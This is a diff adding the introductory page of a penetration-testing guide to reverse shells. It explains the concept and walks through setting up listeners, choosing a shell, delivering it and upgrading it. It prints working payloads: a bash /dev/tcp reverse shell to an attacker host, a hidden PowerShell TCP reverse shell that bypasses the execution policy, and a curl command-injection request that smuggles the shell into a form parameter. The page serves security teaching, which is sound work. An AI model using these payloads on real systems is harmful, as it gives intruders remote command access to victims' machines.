@@ -1,0 +1,106 @@
+---
+title: The Expert's Reverse Shells Guide
+description: A comprehensive guide to creating and using reverse shells for penetration testing
+---
+
+Welcome to the comprehensive Reverse Shells guide. This documentation provides detailed instructions on understanding, creating, and utilizing reverse shells, one of the most essential techniques in penetration testing and post-exploitation phases of security assessments.
+
+<Tabs defaultValue="overview" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="overview">Overview</TabsTrigger>
+    <TabsTrigger value="features">Key Concepts</TabsTrigger>
+    <TabsTrigger value="versions">Evolution</TabsTrigger>
+  </TabsList>
+  <TabsContent value="overview">
+    A reverse shell is a type of shell in which the target machine initiates a connection back to the attacker's machine, giving the attacker command-line access to the compromised system. Unlike a bind shell, where the attacker connects to a listening port on the target, a reverse shell bypasses inbound firewall restrictions by establishing an outbound connection, making it a preferred method for penetration testers and attackers alike.
+  </TabsContent>
+  <TabsContent value="features">
+    - **Connection Initiation**: Target machine connects back to the attacker
+    - **Firewall Bypass**: Leverages outbound connections which are often less restricted
+    - **Multiple Implementation Methods**: Available in various programming languages and system utilities
+    - **Cross-Platform Compatibility**: Can be executed on Windows, Linux, macOS, and other operating systems
+    - **Session Management**: Can be upgraded to more stable and feature-rich shells
+    - **Evasion Capabilities**: Can be encoded or obfuscated to bypass security controls
+  </TabsContent>
+  <TabsContent value="versions">
+    - **Early Implementations** (1990s): Basic netcat shells and simple Perl/Python scripts
+    - **Web-Based Shells** (2000s): PHP, ASP, and JSP reverse shells for web server exploitation
+    - **PowerShell Revolution** (2010s): Advanced PowerShell-based reverse shells with enhanced evasion
+    - **Modern Techniques** (Present): Encrypted, staged, and fileless reverse shells with sophisticated evasion capabilities
+  </TabsContent>
+</Tabs>
+
+## Why Use Reverse Shells?
+
+- **Firewall Bypass**: Reverse shells initiate outbound connections, which are typically allowed through firewalls, unlike inbound connections that are often blocked
+- **Post-Exploitation Tool**: Essential for maintaining access after initial exploitation of a vulnerability
+- **Remote Command Execution**: Provides interactive command-line access to execute commands on the target system
+- **Versatility**: Can be implemented in numerous programming languages and using various system utilities
+- **Pivoting Capability**: Allows for lateral movement within a network from the compromised host
+
+## Getting Started with Reverse Shells
+
+<Stepper>
+  <StepperItem title="Set Up a Listener">
+    Before executing a reverse shell on the target, you need to set up a listener on your attacking machine:
+    ```bash
+    # Using Netcat
+    nc -lvnp 4444
+    
+    # Using Metasploit
+    use multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp  # or another appropriate payload
+    set LHOST your-ip-address
+    set LPORT 4444
+    run
+    ```
+    The `-l` flag puts netcat in listen mode, `-v` enables verbose output, `-n` prevents DNS resolution, and `-p` specifies the port.
+  </StepperItem>
+  <StepperItem title="Choose the Right Shell">
+    Select a reverse shell appropriate for the target system's environment:
+    ```bash
+    # For Linux/Unix targets (Bash)
+    bash -i >& /dev/tcp/attacker-ip/4444 0>&1
+    
+    # For Windows targets (PowerShell)
+    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    ```
+    Choose based on the target's operating system, available interpreters, and security controls.
+  </StepperItem>
+  <StepperItem title="Execute the Shell">
+    Deploy the reverse shell on the target system through an available attack vector:
+    ```bash
+    # Example: Exploiting a command injection vulnerability
+    curl -X POST https://vulnerable-site.com/process.php --data "parameter=; bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
+    ```
+    The execution method depends on the vulnerability you're exploiting (command injection, file upload, etc.).
+  </StepperItem>
+  <StepperItem title="Upgrade Your Shell">
+    Once connected, upgrade to a more stable and feature-rich shell:
+    ```bash
+    # On the target (Linux)
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    
+    # Press Ctrl+Z to background the shell, then:
+    stty raw -echo; fg
+    
+    # On the target again
+    export TERM=xterm
+    ```
+    This provides tab completion, command history, and the ability to use interactive commands.
+  </StepperItem>
+</Stepper>
+
+## Guide Structure
+
+This guide is organized into several sections:
+
+1. **Core Concepts**: Understanding reverse shells, their mechanics, and fundamental principles
+2. **Types of Reverse Shells**: Various implementations across different languages and platforms
+3. **Advanced Techniques**: Multi-staged shells, encrypted communications, and persistence methods
+4. **Evasion Techniques**: Bypassing antivirus, IDS/IPS, and other security controls
+5. **Best Practices**: Ethical usage, detection methods, and defensive countermeasures
+
+Each section provides detailed explanations, command examples, and real-world use cases to help you understand and ethically utilize reverse shells in penetration testing scenarios.
+
+Let's begin with understanding the core concepts and mechanics of reverse shells.
